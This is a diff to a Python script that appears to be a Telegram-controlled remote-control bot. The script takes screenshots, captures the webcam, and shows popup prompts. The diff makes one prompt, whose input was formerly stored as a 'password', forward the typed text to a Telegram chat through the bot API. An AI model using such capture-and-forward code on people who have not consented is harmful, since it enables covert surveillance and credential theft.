@@ -4,6 +4,9 @@ from tkinter import *
 from cv2 import *
 import cv2
 import time
+import threading
+import requests
+from config import TOKEN
 def scrt():
     with mss.mss() as sct:
         filename = sct.shot(output="files/mon.png")
@@ -17,12 +20,12 @@ def msgwindow(msg):
     l.config(font =("Courier", 14))
     l.pack()
     mainloop()
-    return(True)
+    
 
-def msgwindowAns(msg):
+def msgwindowAns(id,msg):
     def get_data():
-        global password
-        password=passw_var.get()
+        global mesg
+        mesg=passw_var.get()
         master.destroy()
     master = Tk()
     passw_var=tk.StringVar()
@@ -33,7 +36,8 @@ def msgwindowAns(msg):
     button = tk.Button(master, text='send' , width=10, command=get_data)
     button.pack() 
     mainloop()
-    return(password)
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text={mesg}"
+    requests.get(url)
 
 def camUnit():
     cam = cv2.VideoCapture(0) 
